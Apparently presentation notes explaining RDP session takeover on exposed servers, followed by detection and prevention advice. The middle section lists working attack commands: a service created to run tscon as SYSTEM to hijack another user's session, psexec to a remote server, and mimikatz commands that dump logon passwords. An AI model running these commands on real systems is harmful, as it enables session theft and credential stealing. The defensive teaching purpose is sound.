
Attackers are targeting open RDP server (server exposed on the internet with the RDP service) ▪ One they compromise a local account, they can move on and try to steal sessions ▪ To steal an RDP session, you need: ▪ A local administrator (can be a local user) ▪ No outside tools, you can use tools available by default on the OS ▪ Another user connected to the system (either through RDP or the console) ▪ The objective: redirect the user’s session into your session ▪ The attacker is now in the user’s session and can access things on the network



RDP session take over 

List current sessions
query user 
query session 

Create a service to run tscon as SYSTEM 
sc create FakeService binpath= "cmd.exe /k tscon 2 /dest:console“ 
net start FakeService

psexec.exe \\SRV01 cmd.exe -accepteula

mimikatz.exe
privilege::debug
sekurlsa::logonPasswords

Detection and prevention
The attack leaves quite a lot of artefacts behind ▪ Process creation for tscon.exe running as SYSTEM ▪ Creation of a new service ▪ Most EDRs will detect it ▪ To prevent it… It’s all about good administrative practices ▪ Users should not leave RDP session signed-in while inactive ▪ Admins should not connects using RDP to servers where the local administrators have less privileges than them on the network then no privilege escalation are possible ▪ Use /retrictedadmin mode, you can still have your session taken over, but no privilege escalation are possible

